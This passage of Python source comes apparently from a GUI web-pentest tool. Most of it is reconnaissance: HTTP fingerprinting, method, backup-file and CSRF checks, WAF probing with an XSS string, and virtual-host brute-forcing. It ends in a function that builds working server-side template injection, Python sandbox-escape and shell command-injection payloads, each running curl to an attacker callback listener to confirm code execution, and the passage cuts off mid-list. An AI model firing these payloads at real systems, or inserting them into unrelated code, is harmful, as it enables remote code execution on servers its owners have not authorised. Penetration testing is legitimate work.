                            'value': page_data.get('title', 'No title'),
                            'extra': str(page_data.get('status_code', 200)),
                            'type': 'page'
                        }
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
    
    def _nikto_scan(self, results):
        """Perform Huginn vulnerability scan"""
        try:
            self.signals.output.emit("<p style='color: #FFD700;'>Starting Huginn vulnerability scan...</p><br>")
            
            from app.tools.huginn_vuln_scanner import HuginnVulnScanner
            import asyncio
            
            scanner = HuginnVulnScanner(self.target)
            scan_results = asyncio.run(scanner.scan())
            
            # Display server info
            server_info = scan_results.get('server_info', {})
            if server_info.get('server'):
                self.signals.output.emit(f"<p><b>Server:</b> {h(server_info['server'])}</p><br>")
            if server_info.get('powered_by'):
                self.signals.output.emit(f"<p><b>Powered By:</b> {h(server_info['powered_by'])}</p><br>")
            
            # Display vulnerabilities
            vulnerabilities = scan_results.get('vulnerabilities', [])
            if vulnerabilities:
                self.signals.output.emit(f"<p style='color: #FF6B6B;'><b>Vulnerabilities Found ({len(vulnerabilities)}):</b></p><br>")
                
                for vuln in vulnerabilities:
                    severity_color = {'High': '#FF6B6B', 'Medium': '#FFD700', 'Low': '#87CEEB'}.get(vuln.get('severity', 'Low'), '#87CEEB')
                    self.signals.output.emit(f"<p style='color: {severity_color};'><b>[{h(vuln.get('severity', 'Unknown'))}]</b> {h(vuln.get('type', 'Unknown'))}</p>")
                    self.signals.output.emit(f"<p style='margin-left: 20px;'>{h(vuln.get('description', 'No description'))}</p>")
                    if vuln.get('path'):
                        self.signals.output.emit(f"<p style='margin-left: 20px;'><b>Path:</b> {h(vuln['path'])}</p>")
                    self.signals.output.emit("<br>")
            
            # Display info items
            info_items = scan_results.get('info', [])
            if info_items:
                self.signals.output.emit("<p style='color: #87CEEB;'><b>Information:</b></p><br>")
                for info in info_items:
                    self.signals.output.emit(f"<p style='margin-left: 20px;'>{h(info)}</p><br>")
            
            results['huginn_scan'] = scan_results
            
            # Collect vulnerability data
            if vulnerabilities:
                self.data_collector.collect_vulnerabilities(self.target, vulnerabilities)
                self.signals.output.emit(f"<p style='color: #00FF41;'>Huginn scan completed: {len(vulnerabilities)} vulnerabilities found</p><br>")
            else:
                self.signals.output.emit("<p style='color: #00FF41;'>Huginn scan completed: No vulnerabilities found</p><br>")
                
        except Exception as e:
            self.signals.output.emit(f"<p style='color: #FFAA00;'>Huginn scan failed: {h(str(e))}</p><br>")
    
    def _build_nikto_tree(self, results):
        """Build tree structure for Huginn scan results"""
        try:
            if 'huginn_scan' in results:
                scan_data = results['huginn_scan']
                huginn_key = "Huginn Vulnerability Scan"
                self.crawl_tree_data[huginn_key] = {
                    'name': 'Huginn Vulnerability Scan',
                    'type': 'category',
                    'children': []
                }
                
                # Add server info
                server_info = scan_data.get('server_info', {})
                if server_info.get('server'):
                    self.crawl_tree_data[huginn_key]['children'].append({
                        'field': 'Server:',
                        'value': server_info['server'],
                        'type': 'detail'
                    })
                
                # Add vulnerabilities
                for vuln in scan_data.get('vulnerabilities', []):
                    self.crawl_tree_data[huginn_key]['children'].append({
                        'field': f"{vuln.get('type', 'Unknown')}:",
                        'value': vuln.get('severity', 'Unknown'),
                        'type': 'vulnerability'
                    })
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
    
    def _http_title(self):
        try:
            response = self._make_request('GET', self.target, timeout=10)
            try:
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(response.text, 'html.parser')
                title = soup.find('title')
            except ImportError:
                # Fallback: extract title using regex
                import re
                title_match = re.search(r'<title[^>]*>([^<]+)</title>', response.text, re.IGNORECASE)
                if title_match:
                    title_text = title_match.group(1).strip()
                    self.signals.output.emit(f"<p style='color: #00FF41;'><b>Page Title:</b> {h(title_text)}</p><br>")
                    return {'http_title': title_text}
                return {}
            if title:
                title_text = title.get_text().strip()
                self.signals.output.emit(f"<p style='color: #00FF41;'><b>Page Title:</b> {h(title_text)}</p><br>")
                return {'http_title': title_text}
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
        return {}
    
    def _http_headers(self):
        try:
            response = self._make_request('GET', self.target, timeout=10)
            headers = dict(response.headers)
            self.signals.output.emit("<p style='color: #87CEEB;'><b>HTTP Headers:</b></p><br>")
            for header, value in headers.items():
                self.signals.output.emit(f"<p style='margin-left: 20px;'><b>{h(header)}:</b> {h(value)}</p><br>")
            self.signals.output.emit("<br>")
            return {'http_headers': headers}
        except:
            return {}
    
    def _http_methods(self):
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'TRACE', 'PATCH']
        allowed_methods = []
        try:
            for method in methods:
                try:
                    session = self._get_session()
                    response = session.request(method, self.target, timeout=5)
                    if response.status_code not in [405, 501]:
                        allowed_methods.append(method)
                except Exception as _exc:
                    pass
                    logger.debug("Suppressed exception", exc_info=True)
            
            if allowed_methods:
                self.signals.output.emit(f"<p style='color: #00FF41;'><b>Allowed HTTP Methods:</b> {', '.join(allowed_methods)}</p><br>")
                if 'TRACE' in allowed_methods:
                    self.signals.output.emit("<p style='color: #FF6B6B;'><b>Security Issue:</b> HTTP TRACE method enabled</p><br>")
            return {'http_methods': allowed_methods}
        except:
            return {}
    
    def _http_robots(self):
        try:
            robots_url = f"{self.target.rstrip('/')}/robots.txt"
            response = self._make_request('GET', robots_url, timeout=5)
            if response.status_code == 200:
                robots_content = response.text
                self.signals.output.emit("<p style='color: #00FF41;'><b>robots.txt found:</b></p><br>")
                lines = robots_content.split('\n')[:10]  # Show first 10 lines
                for line in lines:
                    if line.strip():
                        self.signals.output.emit(f"<p style='margin-left: 20px;'>{h(line)}</p><br>")
                self.signals.output.emit("<br>")
                return {'http_robots': robots_content}
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
        return {}
    
    def _http_comments(self):
        try:
            response = self._make_request('GET', self.target, timeout=10)
            content = response.text
            comments = re.findall(r'<!--(.*?)-->', content, re.DOTALL)
            if comments:
                self.signals.output.emit(f"<p style='color: #FFD700;'><b>HTML Comments found ({len(comments)}):</b></p><br>")
                for i, comment in enumerate(comments[:5]):
                    clean_comment = comment.strip()[:100]
                    self.signals.output.emit(f"<p style='margin-left: 20px;'>{h(i+1)}. {h(clean_comment)}...</p><br>")
                self.signals.output.emit("<br>")
                return {'http_comments': comments}
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
        return {}
    
    def _http_auth_finder(self):
        auth_indicators = []
        try:
            response = self._make_request('GET', self.target, timeout=10, verify=self.ssl_verify)
            
            # Check for HTTP auth
            if response.status_code == 401:
                auth_indicators.append('HTTP Basic/Digest Auth detected')
            
            # Check for login forms
            try:
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(response.text, 'html.parser')
            except ImportError:
                self.signals.output.emit("<p style='color: #FFAA00;'>BeautifulSoup not available for form detection</p><br>")
                return {'http_auth': auth_indicators}
            forms = soup.find_all('form')
            for form in forms:
                inputs = form.find_all('input')
                input_types = [inp.get('type', '').lower() for inp in inputs]
                if 'password' in input_types:
                    auth_indicators.append('Login form detected')
                    break
            
            if auth_indicators:
                self.signals.output.emit("<p style='color: #FFD700;'><b>Authentication Methods:</b></p><br>")
                for indicator in auth_indicators:
                    self.signals.output.emit(f"<p style='margin-left: 20px;'>{h(indicator)}</p><br>")
                self.signals.output.emit("<br>")
            
            return {'http_auth': auth_indicators}
        except:
            return {}
    
    def _http_waf_detect(self):
        try:
            # Test with malicious payload
            test_payload = "<script>alert('xss')</script>"
            response = self._make_request('GET', f"{self.target}?test={test_payload}", timeout=5, verify=self.ssl_verify)
            
            waf_indicators = []
            
            # Check response for WAF signatures
            if response.status_code in [403, 406, 429]:
                waf_indicators.append(f'Blocked request (Status: {response.status_code})')
            
            # Check headers for WAF signatures
            headers = response.headers
            waf_headers = {
                'cloudflare': 'cf-ray',
                'akamai': 'akamai-ghost-ip',
                'aws-waf': 'x-amzn-requestid',
                'incapsula': 'x-iinfo'
            }
            
            for waf_name, header in waf_headers.items():
                if header in headers:
                    waf_indicators.append(f'{waf_name.upper()} WAF detected')
            
            if waf_indicators:
                self.signals.output.emit("<p style='color: #FF6B6B;'><b>WAF Detection:</b></p><br>")
                for indicator in waf_indicators:
                    self.signals.output.emit(f"<p style='margin-left: 20px;'>{h(indicator)}</p><br>")
                self.signals.output.emit("<br>")
            
            return {'http_waf': waf_indicators}
        except:
            return {}
    
    def _http_php_version(self):
        try:
            response = self._make_request('GET', self.target, timeout=10, verify=self.ssl_verify)
            headers = response.headers
            
            php_version = None
            if 'x-powered-by' in headers:
                powered_by = headers['x-powered-by']
                if 'php' in powered_by.lower():
                    php_version = powered_by
            
            if php_version:
                self.signals.output.emit(f"<p style='color: #00FF41;'><b>PHP Version:</b> {h(php_version)}</p><br>")
                return {'php_version': php_version}
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
        return {}
    
    def _display_enterprise_fingerprint(self, fingerprint):
        """Display enterprise fingerprint results"""
        self.signals.output.emit("<p style='color: #87CEEB;'><b>🔍 Advanced Fingerprinting Results:</b></p><br>")
        
        if fingerprint.get('server'):
            self.signals.output.emit(f"<p><b>Server:</b> {h(fingerprint['server'])}</p><br>")
        
        if fingerprint.get('title'):
            self.signals.output.emit(f"<p><b>Title:</b> {h(fingerprint['title'])}</p><br>")
        
        if fingerprint.get('favicon_hash'):
            self.signals.output.emit(f"<p><b>Favicon Hash:</b> {h(fingerprint['favicon_hash'])}</p><br>")
    
    def _display_security_audit(self, security_audit):
        """Display security audit results"""
        self.signals.output.emit("<p style='color: #FFD700;'><b>🔒 Security Audit Results:</b></p><br>")
        
        # Security headers
        if 'security_headers' in security_audit:
            headers = security_audit['security_headers']
            score = headers.get('score', '0/0')
            self.signals.output.emit(f"<p><b>Security Headers Score:</b> {score}</p><br>")
        
        # HTTP methods
        if 'http_methods' in security_audit:
            methods = security_audit['http_methods']
            if methods:
                self.signals.output.emit(f"<p><b>Allowed HTTP Methods:</b> {', '.join(methods)}</p><br>")
        
        # Default credentials - only show if blank credentials work
        if 'default_creds' in security_audit and security_audit['default_creds']:
            self.signals.output.emit("<p style='color: #FF6B6B;'><b>⚠️ Default Credentials Found:</b></p><br>")
            for cred in security_audit['default_creds']:
                username = cred['username']
                password = cred['password']
                self.signals.output.emit(f"<p style='margin-left: 20px;'>{h(cred['vendor'])}: {h(username)}/{h(password)}</p><br>")
            self.signals.output.emit("<br>")
    
    def _display_surface_index(self, surface_index):
        """Display surface indexing results"""
        self.signals.output.emit("<p style='color: #87CEEB;'><b>🌐 Surface Index Results:</b></p><br>")
        
        if 'routes' in surface_index and surface_index['routes']:
            self.signals.output.emit(f"<p><b>Accessible Routes:</b> {len(surface_index['routes'])}</p><br>")
            for route in surface_index['routes'][:10]:  # Show first 10
                self.signals.output.emit(f"<p style='margin-left: 20px;'>{h(route['path'])} (Status: {h(route['status'])})</p><br>")
        
        if 'login_portals' in surface_index and surface_index['login_portals']:
            self.signals.output.emit(f"<p style='color: #FFD700;'><b>Login Portals Found:</b> {len(surface_index['login_portals'])}</p><br>")
    
    def _display_device_matches(self, device_matches):
        """Display device matching results"""
        if device_matches:
            self.signals.output.emit("<p style='color: #00FF41;'><b>🔍 Device Matches:</b></p><br>")
            for match in device_matches[:3]:  # Show top 3 matches
                self.signals.output.emit(f"<p><b>{h(match['vendor'].upper())}:</b> {h(match['confidence'])}% confidence</p><br>")
                if match.get('details'):
                    for key, value in match['details'].items():
                        self.signals.output.emit(f"<p style='margin-left: 20px;'>{h(key)}: {h(value)}</p><br>")
                self.signals.output.emit("<br>")
    
    def _display_vulnerabilities(self, vulnerabilities):
        """Display vulnerability results"""
        if vulnerabilities:
            self.signals.output.emit("<p style='color: #FF6B6B;'><b>⚠️ Vulnerabilities Found:</b></p><br>")
            for vuln in vulnerabilities:
                severity_color = {'High': '#FF6B6B', 'Medium': '#FFD700', 'Low': '#87CEEB'}.get(vuln.get('severity', 'Low'), '#87CEEB')
                self.signals.output.emit(f"<p style='color: {severity_color};'><b>{h(vuln['type'])}</b> ({h(vuln.get('severity', 'Unknown'))})</p>")
                self.signals.output.emit(f"<p style='margin-left: 20px;'>{h(vuln.get('description', 'No description'))}</p><br>")
            self.signals.output.emit("<br>")
    

    
    def _build_enterprise_tree(self, results):
        """Build tree structure for Enterprise Scripts results"""
        try:
            enterprise_results = results.get('enterprise_results', {})
            
            # Clear existing data
            self.crawl_tree_data = {}
            
            # 1. FINGERPRINT CATEGORY
            if enterprise_results.get('fingerprint'):
                fp = enterprise_results['fingerprint']
                fingerprint_key = "Device Fingerprint"
                self.crawl_tree_data[fingerprint_key] = {
                    'name': 'Device Fingerprint',
                    'type': 'category',
                    'children': []
                }
                
                if fp.get('server'):
                    self.crawl_tree_data[fingerprint_key]['children'].append({
                        'field': 'Server:',
                        'value': fp['server'],
                        'type': 'detail'
                    })
                
                if fp.get('title'):
                    self.crawl_tree_data[fingerprint_key]['children'].append({
                        'field': 'Title:',
                        'value': fp['title'],
                        'type': 'detail'
                    })
                
                # Add JS variables
                for key, value in fp.get('js_variables', {}).items():
                    self.crawl_tree_data[fingerprint_key]['children'].append({
                        'field': f'{key}:',
                        'value': value,
                        'type': 'js_var'
                    })
            
            # 2. SECURITY AUDIT CATEGORY
            if enterprise_results.get('security_audit'):
                audit = enterprise_results['security_audit']
                security_key = "Security Audit"
                self.crawl_tree_data[security_key] = {
                    'name': 'Security Audit',
                    'type': 'category',
                    'children': []
                }
                
                # Security headers score
                if audit.get('security_headers', {}).get('score'):
                    self.crawl_tree_data[security_key]['children'].append({
                        'field': 'Security Score:',
                        'value': audit['security_headers']['score'],
                        'type': 'score'
                    })
                
                # HTTP methods
                if audit.get('http_methods'):
                    methods_str = ', '.join(audit['http_methods'])
                    self.crawl_tree_data[security_key]['children'].append({
                        'field': 'HTTP Methods:',
                        'value': methods_str,
                        'type': 'methods'
                    })
            
            # 3. SURFACE INDEX CATEGORY
            if enterprise_results.get('surface_index'):
                surface = enterprise_results['surface_index']
                surface_key = "Surface Index"
                self.crawl_tree_data[surface_key] = {
                    'name': 'Surface Index',
                    'type': 'category',
                    'children': []
                }
                
                # Add route counts
                route_counts = {
                    'Total Routes': len(surface.get('routes', [])),
                    'Login Portals': len(surface.get('login_portals', [])),
                    'API Endpoints': len(surface.get('apis', [])),
                    'Admin Panels': len(surface.get('admin_panels', []))
                }
                
                for label, count in route_counts.items():
                    self.crawl_tree_data[surface_key]['children'].append({
                        'field': f'{label}:',
                        'value': str(count),
                        'type': 'count'
                    })
            
            # 4. DEVICE MATCHES CATEGORY
            if enterprise_results.get('device_match'):
                matches = enterprise_results['device_match']
                if matches:
                    match_key = "Device Matches"
                    self.crawl_tree_data[match_key] = {
                        'name': 'Device Matches',
                        'type': 'category',
                        'children': []
                    }
                    
                    for match in matches[:3]:
                        self.crawl_tree_data[match_key]['children'].append({
                            'field': f"{match['vendor'].upper()}:",
                            'value': f"{match['confidence']}% confidence",
                            'type': 'match'
                        })
            
            # 5. VULNERABILITIES CATEGORY
            if enterprise_results.get('vulnerabilities'):
                vulns = enterprise_results['vulnerabilities']
                if vulns:
                    vuln_key = "Vulnerabilities"
                    self.crawl_tree_data[vuln_key] = {
                        'name': 'Vulnerabilities',
                        'type': 'category',
                        'children': []
                    }
                    
                    for vuln in vulns:
                        self.crawl_tree_data[vuln_key]['children'].append({
                            'field': vuln['type'],
                            'value': vuln['severity'],
                            'type': 'vulnerability'
                        })
        
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
    
    def _http_csrf(self):
        try:
            response = requests.get(self.target, timeout=10, verify=self.ssl_verify)
            try:
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(response.text, 'html.parser')
                
                csrf_tokens = []
                # Look for common CSRF token patterns
                csrf_patterns = ['csrf', 'token', '_token', 'authenticity_token']
                
                for pattern in csrf_patterns:
                    tokens = soup.find_all('input', {'name': re.compile(pattern, re.I)})
                    csrf_tokens.extend([token.get('name') for token in tokens])
            except ImportError:
                # Fallback: use regex to find CSRF tokens
                csrf_tokens = []
                csrf_patterns = ['csrf', 'token', '_token', 'authenticity_token']
                for pattern in csrf_patterns:
                    matches = re.findall(rf'<input[^>]+name=["\']({pattern}[^"\']*)["\'][^>]*>', response.text, re.IGNORECASE)
                    csrf_tokens.extend(matches)
            
            if csrf_tokens:
                self.signals.output.emit(f"<p style='color: #00FF41;'><b>CSRF Tokens found:</b> {', '.join(set(csrf_tokens))}</p><br>")
            else:
                self.signals.output.emit("<p style='color: #FFAA00;'><b>No CSRF protection detected</b></p><br>")
            
            return {'csrf_tokens': list(set(csrf_tokens))}
        except:
            return {}
    
    def _http_backup_finder(self):
        backup_extensions = ['.bak', '.old', '.backup', '.zip', '.tar.gz', '.sql']
        common_files = ['index', 'admin', 'login', 'config', 'database']
        found_backups = []
        
        try:
            for file in common_files:
                for ext in backup_extensions:
                    backup_url = f"{self.target.rstrip('/')}/{file}{ext}"
                    try:
                        response = requests.get(backup_url, timeout=3, verify=self.ssl_verify)
                        if response.status_code == 200:
                            found_backups.append(f"{file}{ext}")
                            self.signals.output.emit(f"<p style='color: #FF6B6B;'><b>Backup file found:</b> {h(file)}{h(ext)}</p>")
                    except Exception as _exc:
                        pass
                        logger.debug("Suppressed exception", exc_info=True)
            
            if found_backups:
                self.signals.output.emit("<br>")
            
            return {'backup_files': found_backups}
        except:
            return {}
    
    def _http_favicon(self):
        try:
            favicon_url = f"{self.target.rstrip('/')}/favicon.ico"
            response = requests.get(favicon_url, timeout=5, verify=self.ssl_verify)
            if response.status_code == 200:
                import hashlib
                favicon_hash = hashlib.md5(response.content).hexdigest()
                self.signals.output.emit(f"<p style='color: #87CEEB;'><b>Favicon hash:</b> {h(favicon_hash)}</p><br>")
                return {'favicon_hash': favicon_hash}
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
        return {}
    

    
    def _vhost_brute(self, results):
        """Virtual host brute-force via Host header manipulation.
        
        Replicates gobuster vhost --append-domain behavior:
        - Gets baseline response from target
        - Iterates wordlist, sending requests with Host: <word>.<domain>
        - Reports entries where response differs from baseline
        """
        try:
            parsed = urlparse(self.target if '://' in self.target else f'http://{self.target}')
            base_domain = parsed.hostname
            scheme = parsed.scheme or 'http'
            port = parsed.port
            
            # Use resolved IP if available (critical for .htb domains that don't resolve via system DNS)
            if hasattr(self, 'resolved_ip') and self.resolved_ip:
                connect_host = self.resolved_ip
            else:
                connect_host = base_domain
            
            # Build the URL to connect to (using IP, not hostname)
            if port and port not in (80, 443):
                base_url = f"{scheme}://{connect_host}:{port}"
            else:
                base_url = f"{scheme}://{connect_host}"
            
            self.signals.output.emit(f"<p style='color: #FFD700;'>Starting VHost brute-force on {h(base_domain)}...</p><br>")
            self.signals.output.emit(f"<p style='color: #87CEEB;'>Connecting to: {h(base_url)}, Host header domain: {h(base_domain)}</p><br>")
            
            # Load wordlist
            wordlist = []
            if self.wordlist_path and os.path.exists(self.wordlist_path):
                with open(self.wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                    wordlist = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                self.signals.output.emit(f"<p style='color: #87CEEB;'>Loaded wordlist: {h(os.path.basename(self.wordlist_path))} ({len(wordlist)} entries)</p><br>")
            else:
                # Default common vhosts
                wordlist = [
                    'admin', 'api', 'dev', 'test', 'staging', 'beta', 'demo', 'www',
                    'mail', 'ftp', 'blog', 'shop', 'store', 'portal', 'app', 'mobile',
                    'internal', 'intranet', 'vpn', 'remote', 'secure', 'dashboard',
                    'monitor', 'status', 'docs', 'wiki', 'git', 'jenkins', 'ci',
                    'cdn', 'static', 'assets', 'media', 'images', 'files', 'backup',
                    'db', 'database', 'mysql', 'postgres', 'redis', 'elastic',
                    'grafana', 'prometheus', 'kibana', 'sentry', 'jira', 'confluence'
                ]
                self.signals.output.emit(f"<p style='color: #87CEEB;'>No wordlist selected, using built-in list ({len(wordlist)} entries)</p><br>")
            
            # Get baseline response (with the original domain as Host header)
            self.signals.output.emit(f"<p style='color: #87CEEB;'>Getting baseline response...</p><br>")
            session = self._get_session()
            
            try:
                baseline_resp = session.get(
                    base_url, 
                    headers={'Host': base_domain},
                    timeout=10, 
                    allow_redirects=True
                )
                baseline_status = baseline_resp.status_code
                baseline_size = len(baseline_resp.text)
                self.signals.output.emit(
                    f"<p style='color: #87CEEB;'>Baseline: Status={baseline_status}, Size={baseline_size}</p><br>"
                )
            except Exception as e:
                self.signals.output.emit(f"<p style='color: #FF4444;'>Failed to get baseline: {h(str(e))}</p><br>")
                results['vhost_results'] = []
                return
            
            # Brute-force vhosts
            discovered = []
            total = len(wordlist)
            self.signals.progress_start.emit(total, "VHost brute-force")
            
            for i, word in enumerate(wordlist):
                if not getattr(self, 'is_running', True):
                    break
                
                test_host = f"{word}.{base_domain}"
                
                try:
                    resp = session.get(
                        base_url, 
                        headers={'Host': test_host}, 
                        timeout=5, 
                        allow_redirects=False
                    )
                    resp_status = resp.status_code
                    resp_size = len(resp.text)
                    
                    # Detect difference from baseline (filter out redirects as false positives)
                    if resp_status in (301, 302, 307, 308):
                        continue
                    
                    status_diff = resp_status != baseline_status
                    size_diff = abs(resp_size - baseline_size) > 50
                    
                    if status_diff or size_diff:
                        discovered.append({
                            'vhost': test_host,
                            'status': resp_status,
                            'size': resp_size,
                            'reason': 'status' if status_diff else 'size'
                        })
                        
                        reason = f"Status: {resp_status}" if status_diff else f"Size: {resp_size} (baseline: {baseline_size})"
                        self.signals.output.emit(
                            f"<p style='color: #00FF41;'>✓ Found: {h(test_host)} [{reason}]</p><br>"
                        )
                
                except requests.exceptions.ConnectionError:
                    continue
                except requests.exceptions.Timeout:
                    continue
                except Exception:
                    continue
                
                # Progress update every 50 entries
                if i % 50 == 0:
                    self.signals.progress_update.emit(i, 0, f"Testing: {test_host}")
            
            # Summary
            self.signals.progress_update.emit(total, 0, "Complete")
            self.signals.output.emit(f"<br><p style='color: #FFD700;'>━━━ VHost Brute-Force Complete ━━━</p><br>")
            self.signals.output.emit(f"<p style='color: #87CEEB;'>Tested: {total} hosts</p><br>")
            self.signals.output.emit(f"<p style='color: #00FF41;'>Discovered: {len(discovered)} virtual hosts</p><br>")
            
            if discovered:
                self.signals.output.emit(f"<br><p style='color: #FFD700;'>Discovered Virtual Hosts:</p><br>")
                for entry in discovered:
                    self.signals.output.emit(
                        f"<p style='color: #00FF41;'>  • {h(entry['vhost'])} "
                        f"[Status: {entry['status']}, Size: {entry['size']}]</p><br>"
                    )
            
            results['vhost_results'] = discovered
            
        except Exception as e:
            self.signals.output.emit(f"<p style='color: #FF4444;'>VHost brute-force error: {h(str(e))}</p><br>")
            logger.error(f"VHost brute-force error: {e}")
            results['vhost_results'] = []

    def _full_scan(self, results):
        self.signals.output.emit("<p style='color: #87CEEB;'>Starting comprehensive HTTP scan...</p><br>")
        
        # Initialize progress for full scan
        total_steps = 4 if self.enable_crawl else 3
        self.signals.progress_start.emit(total_steps, "Starting full scan")
        
        # Run all scan components
        self.signals.progress_update.emit(1, 0, "Basic fingerprinting")
        self._basic_fingerprint(results)
        
        self.signals.progress_update.emit(2, 0, "Directory enumeration")
        # Check for 403 catch-all before directory enumeration
        self._check_403_catchall()
        self._directory_enumeration(results)
        
        self.signals.progress_update.emit(3, 0, "Source code analysis")
        self._source_code_analysis(results)
        
        if self.enable_crawl:
            self.signals.progress_update.emit(4, 0, "Web crawling")
            self._web_crawler(results)
        
        # Build combined table for Full Scan
        self._build_full_scan_table(results)
    
    def _build_full_scan_table(self, results):
        """Build table data for Full Scan results"""
        try:
            self.full_scan_table_data = []
            
            # 1. FINGERPRINT DATA
            if 'server' in results:
                self.full_scan_table_data.append([
                    "Fingerprint", "Server", results['server'], "Web server identification"
                ])
            
            if 'status_code' in results:
                self.full_scan_table_data.append([
                    "Fingerprint", "Status Code", str(results['status_code']), "HTTP response status"
                ])
            
            if 'content_length' in results:
                self.full_scan_table_data.append([
                    "Fingerprint", "Content Length", f"{results['content_length']:,} bytes", "Response body size"
                ])
            
            # 2. DIRECTORIES DATA
            if 'directories' in results and results['directories']:
                for directory in results['directories']:
                    self.full_scan_table_data.append([
                        "Directory", f"/{directory['path']}", f"Status {directory['status']}", f"Size: {directory.get('size', 0):,} bytes"
                    ])
            
            # 3. SOURCE CODE FINDINGS DATA
            if 'source_findings' in results and results['source_findings']:
                detailed_findings = results.get('detailed_findings', {})
                
                for finding in results['source_findings']:
                    # Categorize findings by type
                    if 'API Keys' in finding:
                        category = "Source Code"
                        item_type = "API Key"
                        details = detailed_findings.get('API Keys', [])
                        detail_text = f"{len(details)} found" if details else "Found"
                    elif 'Database Credentials' in finding:
                        category = "Source Code"
                        item_type = "Credential"
                        details = detailed_findings.get('Database Credentials', [])
                        detail_text = f"{len(details)} found" if details else "Found"
                    elif 'Email Addresses' in finding:
                        category = "Source Code"
                        item_type = "Email Address"
                        details = detailed_findings.get('Email Addresses', [])
                        detail_text = f"{len(details)} found" if details else "Found"
                    elif 'HTML comments' in finding:
                        category = "Source Code"
                        item_type = "HTML Comment"
                        details = detailed_findings.get('HTML comments found', [])
                        detail_text = f"{len(details)} found" if details else "Found"
                    elif 'accessible' in finding.lower():
                        category = "Source Code"
                        item_type = "File Access"
                        detail_text = "Accessible file detected"
                    else:
                        category = "Source Code"
                        item_type = "Information"
                        detail_text = "Information disclosure"
                    
                    self.full_scan_table_data.append([
                        category, finding, item_type, detail_text
                    ])
            
            # 4. CRAWL RESULTS DATA (if enabled)
            if 'crawl_results' in results and results['crawl_results']:
                for url, page_data in list(results['crawl_results'].items())[:10]:  # Show first 10
                    if 'error' not in page_data:
                        self.full_scan_table_data.append([
                            "Crawler", url, f"Status {page_data.get('status_code', 200)}", page_data.get('title', 'No title')
                        ])
        
        except Exception:
            self.full_scan_table_data = []
    
    def _update_crawl_tree(self, found_dirs):
        try:
            from urllib.parse import urlparse
            parsed = urlparse(self.target)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            for item in found_dirs:
                path = item['path']
                status = item['status']
                full_url = f"{base_url}/{path}"
                
                self.crawl_tree_data[full_url] = {
                    'url': full_url,
                    'path': path,
                    'status_code': status,
                    'method': 'Directory Enum',
                    'parent': base_url,
                    'depth': 1,
                    'size': item.get('size', 0)
                }
                
                self.found_items.append({
                    'url': full_url,
                    'status': status,
                    'type': 'directory',
                    'size': item.get('size', 0)
                })
            
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
    
    def _build_directory_tree(self, results):
        """Build tree structure for Directory Enum results"""
        if 'directories' not in results:
            return
        
        self.crawl_tree_data = {}
        for dir_info in results['directories']:
            path = dir_info['path']
            status = dir_info['status']
            size = dir_info.get('size', 0)
            
            self.crawl_tree_data[path] = {
                'field': f"/{path}",
                'value': str(status),
                'extra': f"{size:,} bytes" if size else "",
                'type': 'directory'
            }
    

    
    def _build_crawler_tree(self, results):
        """Build tree structure for Crawler results"""
        if 'crawl_results' not in results:
            return
        
        self.crawl_tree_data = {}
        for url, page_data in results['crawl_results'].items():
            if 'error' not in page_data:
                self.crawl_tree_data[url] = {
                    'field': url,
                    'value': page_data.get('title', 'No title'),
                    'extra': str(page_data.get('status_code', 200)),
                    'type': 'page'
                }
    

    
    def _send_oob_payloads(self, listener_info, ssti_param=None):
        """Send OOB payloads including Python sandbox escape techniques"""
        try:
            import urllib.parse
            import logging
            
            # Get callback URL from listener manager
            callback_url = listener_manager.get_listener_url(self.listener_id)
            if not callback_url:
                self.signals.output.emit(f"<p style='color: #FF6B6B;'>Listener not available for callbacks</p><br>")
                return
            
            self.signals.output.emit(f"<p style='color: #87CEEB;'>Using callback URL: {h(callback_url)}</p><br>")
            logging.debug("[OOB] Using callback URL: %s", callback_url)
            
            # Enhanced OOB payloads including sandbox escape techniques
            oob_payloads = [
                # Traditional SSTI payloads
                f"{{{{ url_for.__globals__.__builtins__.__import__('os').system('curl {callback_url}/ssti_test') }}}}",
                f"{{{{ config.__class__.__init__.__globals__['os'].system('curl {callback_url}/config_test') }}}}",
                
                # Python sandbox escape payloads
                f"().__class__.__base__.__subclasses__()[104](['curl','{callback_url}/popen_test'], shell=False)",
                f"().__class__.__base__.__subclasses__()[59]('curl {callback_url}/subprocess_test', shell=True, stdout=-1).communicate()[0]",
                f"[c for c in ().__class__.__base__.__subclasses__() if 'Popen' in c.__name__][0](['curl','{callback_url}/enum_test'])",
                
                # Object enumeration with callback
                f"len(().__class__.__base__.__subclasses__()) and __import__('os').system('curl {callback_url}/enum_count')",
                
                # Indirect execution primitives
                f"().__class__.__base__.__subclasses__()[40].__init__.__globals__['sys'].modules['os'].system('curl {callback_url}/indirect_test')",
                f"''.__class__.__mro__[1].__subclasses__()[40]('curl {callback_url}/mro_test')",
                
                # Pure Python execution contexts
                f"__import__('os').system('curl {callback_url}/python_test')",
                f"exec(\"import os; os.system('curl {callback_url}/exec_test')\")",
                f"eval(\"__import__('subprocess').call(['curl','{callback_url}/eval_test'])\")",
                
                # Command injection contexts
                f"; curl {callback_url}/cmd_test",
                f"| curl {callback_url}/pipe_test",
                f"&& curl {callback_url}/and_test"
            ]
            
            # URL encode payloads
            encoded_payloads = [urllib.parse.quote(payload, safe='') for payload in oob_payloads]
            
            # Check if we have sandbox-specific information
            account_info = getattr(self, '_last_account_info', {})
            if account_info.get('sandbox_type') == 'python' and account_info.get('dangerous_classes'):
                self.signals.output.emit(f"<p style='color: #FFD700;'>Using Python sandbox escape mode</p><br>")
                
                # Use discovered dangerous classes for targeted OOB
                for class_index, class_name in account_info['dangerous_classes'][:3]:
                    sandbox_payloads = [
                        f"().__class__.__base__.__subclasses__()[{class_index}](['curl','{callback_url}/class_{class_index}'], shell=False)",
